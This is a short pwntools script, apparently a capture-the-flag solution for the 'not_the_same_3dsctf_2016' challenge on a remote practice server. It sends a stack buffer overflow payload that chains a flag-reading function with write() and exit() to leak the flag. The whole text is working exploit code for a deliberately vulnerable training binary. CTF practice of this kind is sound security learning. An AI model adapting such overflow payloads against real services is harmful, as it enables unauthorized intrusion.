from pwn import *
context.log_level = 'debug'
flag_fun_addr = 0x080489A0
write_addr = 0x0806E270
flag_addr = 0x080ECA2D
exit_addr = 0x0804E660
# io = process('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn',27645)
payload = b'a' * (0x2d) + p32(flag_fun_addr) + p32(write_addr) + p32(exit_addr) +  p32(1) + p32(flag_addr)  + p32(45)
# io.recvline()
io.sendline(payload)
io.recv()
